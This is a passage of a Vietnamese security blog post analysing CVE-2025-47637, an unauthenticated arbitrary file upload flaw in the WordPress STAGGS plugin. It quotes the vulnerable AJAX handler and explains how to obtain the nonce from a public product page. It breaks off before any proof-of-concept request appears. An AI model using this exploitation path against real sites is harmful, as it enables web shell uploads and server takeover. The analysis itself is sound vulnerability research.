<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-47637 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress STAGGS Plugin."><meta name="keywords" content='analyst, plugin, arbitrary file upload'>
  <meta itemprop="name" content="CVE-2025-47637 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress STAGGS Plugin.">
  <meta itemprop="datePublished" content="2025-11-11T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-08T02:31:50+07:00">
  <meta itemprop="wordCount" content="1476">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Arbitrary File Upload"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-47637 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress STAGGS Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-11T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-08T02:31:50+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Arbitrary File Upload">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png">
  <meta name="twitter:title" content="CVE-2025-47637 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress STAGGS Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/" title="CVE-2025-47637 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/" title="POP Chain Analysis &amp; Exploit" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/" title="CVE-2025-32202 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/index.md" title="CVE-2025-47637 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-47637 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-11-cve-2025-47637\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, arbitrary file upload","wordcount":  1476 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-11-cve-2025-47637\/","datePublished": "2025-11-11T19:00:00+07:00","dateModified": "2025-11-08T02:31:50+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress STAGGS Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-11-cve-2025-47637/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-11-cve-2025-47637/">English</option><option value="/vi/posts/2025-11-11-cve-2025-47637/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-11-12-cve-2025-32202/" title="CVE-2025-32202 Analysis &amp; POC">CVE-2025-32202 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-10-cve-2023-48777/" title="CVE-2023-48777 Analysis &amp; POC">CVE-2023-48777 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-09-cve-2025-1128/" title="CVE-2025-1128 Analysis &amp; POC">CVE-2025-1128 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-13-cve-2025-7847/" title="CVE-2025-7847 Analysis &amp; POC">CVE-2025-7847 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-08-cve-2025-39557/" title="CVE-2025-39557 Analysis &amp; POC">CVE-2025-39557 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-07-cve-2025-47577/" title="CVE-2025-47577 Analysis &amp; POC">CVE-2025-47577 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC">CVE-2025-6742 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-47637 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-11 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-11">2025-11-11</time></span>&nbsp;<span title="Cập nhật ngày 2025-11-08 02:31:50"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-08">2025-11-08</time></span>&nbsp;<span title="1476 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 1500 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-11-cve-2025-47637/app.png' alt="/posts/2025-11-11-cve-2025-47637/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#code-analysis">Code Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaway">Key Takeaway</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng <strong>Arbitrary File Upload</strong> trong plugin <strong>STAGGS</strong> cho phép kẻ tấn công tải lên <strong>Web Shell</strong> lên máy chủ web, ảnh hưởng đến các phiên bản <strong>STAGGS từ n/a đến 2.11.0</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-47637"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-47637</a></li>
<li><strong>Vulnerability Type</strong>: Arbitrary File Upload</li>
<li><strong>Affected Versions</strong>: &lt;= 2.11.0</li>
<li><strong>Patched Versions</strong>: 2.12.0</li>
<li><strong>CVSS severity</strong>: High (10)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/staggs/"target="_blank" rel="external nofollow noopener noreferrer">WordPress STAGGS Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>STAGGS</strong>:
<ul>
<li><code>2.11.0</code> – <strong>vulnerable</strong></li>
<li><code>2.12.0</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng xảy ra trong hàm <code>store_final_product_image()</code> thuộc file <code>/wp-content/plugins/staggs/includes/staggs-functions.php</code> do không xác thực <strong>file type</strong> trước khi upload</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/diff.png" title="Xác thực file type" data-thumbnail="/posts/2025-11-11-cve-2025-47637/diff.png" data-sub-html="<h2>Validate File Type</h2><p>Xác thực file type</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/diff.png' alt="Validate File Type" height="1200" width="1920"></a><figcaption class="image-caption">Xác thực file type</figcaption>
  </figure></p>
<p>Bản vá đã sử dụng while list, chỉ chấp nhận các loại file: <code>png</code>,<code>jpg</code>,<code>jpeg</code>,<code>gif</code></p>
<h2 class="heading-element" id="code-analysis"><span>Code Analysis</span>
  <a href="#code-analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký một action hook dành cho người dùng chưa đăng nhập (<code>wp_ajax_nopriv_</code>):</p>
<div class="highlight" title="staggs-functions.php" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span> <span class="s1">&#39;wp_ajax_nopriv_staggs_get_configuration_form_urls&#39;</span><span class="p">,</span> <span class="s1">&#39;staggs_get_configuration_form_urls_ajax&#39;</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi truy cập endpoint <code>/wp-admin/admin-ajax.php</code> với param <code>action=staggs_get_configuration_form_urls</code> thì callback <code>staggs_get_configuration_form_urls_ajax</code> được gọi</p>
<div class="highlight" title="staggs-functions.php" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="hl"><span class="lnt">10
</span></span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">staggs_get_configuration_form_urls_ajax</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line hl"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nonce&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">||</span> <span class="o">!</span> <span class="nx">wp_verify_nonce</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;nonce&#39;</span><span class="p">],</span> <span class="s1">&#39;sgg_ajax_nonce&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;image_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$image_name</span> <span class="o">=</span> <span class="nx">staggs_sanitize_title</span><span class="p">(</span> <span class="nx">get_the_title</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;image_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">);</span> <span class="c1">// image name based on product title.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$image_url</span>  <span class="o">=</span> <span class="nx">store_final_product_image</span><span class="p">(</span> <span class="nv">$image_name</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;values&#39;</span><span class="p">],</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span><span class="p">[</span><span class="s1">&#39;image_url&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$image_url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm này kiểm tra <code>nonce</code> từ request, nếu nó không tồn tại hoặc không hợp lệ thì trả về response rỗng</p>
<div class="alert alert-tip"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z"/></svg>Mẹo</p><p>Khi tìm kiếm với từ khóa <code>sgg_ajax_nonce</code>, ta thấy <code>nonce</code> được tạo bằng key <code>AJAX_NONCE</code> và có comment <code>// image name based on product title.</code> liên quan đến product. Do phần này không yêu cầu xác thực, có thể đây là cơ chế phục vụ việc hiển thị product cho người dùng chưa đăng nhập, và <code>nonce</code> được chèn trực tiếp vào mã nguồn.
Khi thử tính năng tạo product của plugin, hệ thống tạo một post mà người dùng chưa đăng nhập vẫn có thể truy cập.
<code>nonce</code> này xuất hiện trong mã nguồn trả về khi truy cập product vừa được tạo.
<figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/nonce_create.png" title="Cách nonce được tạo" data-thumbnail="/posts/2025-11-11-cve-2025-47637/nonce_create.png" data-sub-html="<h2>Nonce Create</h2><p>Cách nonce được tạo</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/nonce_create.png' alt="Nonce Create" height="327" width="1369"></a><figcaption class="image-caption">Cách nonce được tạo</figcaption>
  </figure>
<figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/product.png" title="Tạo Product bằng plugin" data-thumbnail="/posts/2025-11-11-cve-2025-47637/product.png" data-sub-html="<h2>Create Product</h2><p>Tạo Product bằng plugin</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/product.png' alt="Create Product" height="685" width="1039"></a><figcaption class="image-caption">Tạo Product bằng plugin</figcaption>
  </figure>
<figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/nonce.png" title="Nonce lấy từ response" data-thumbnail="/posts/2025-11-11-cve-2025-47637/nonce.png" data-sub-html="<h2>Nonce</h2><p>Nonce lấy từ response</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/nonce.png' alt="Nonce" height="682" width="1543"></a><figcaption class="image-caption">Nonce lấy từ response</figcaption>
  </figure></p></div><p>Nếu <code>nonce</code> hợp lệ, tiếp tục kiểm tra <code>$_POST['image_id']</code> có tồn tại hay không, nếu có:</p>
<ul>
<li>Lấy <code>image name</code> tức tên của <strong>product title</strong> (theo mô tả: <code>// image name based on product title.</code>)</li>
<li>Gọi <code>store_final_product_image()</code> để lưu ảnh và lấy URL trả về</li>
<li>Trả về phản hồi JSON chứa <code>image_url</code>.</li>
</ul>
<div class="highlight" title="staggs-functions.php" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="hl"><span class="lnt"> 2
</span></span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="hl"><span class="lnt">28
</span></span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="hl"><span class="lnt">33
</span></span><span class="lnt">34
</span><span class="hl"><span class="lnt">35
</span></span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">store_final_product_image</span><span class="p">(</span> <span class="nv">$imagename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$options</span><span class="p">,</span> <span class="nv">$main_image</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
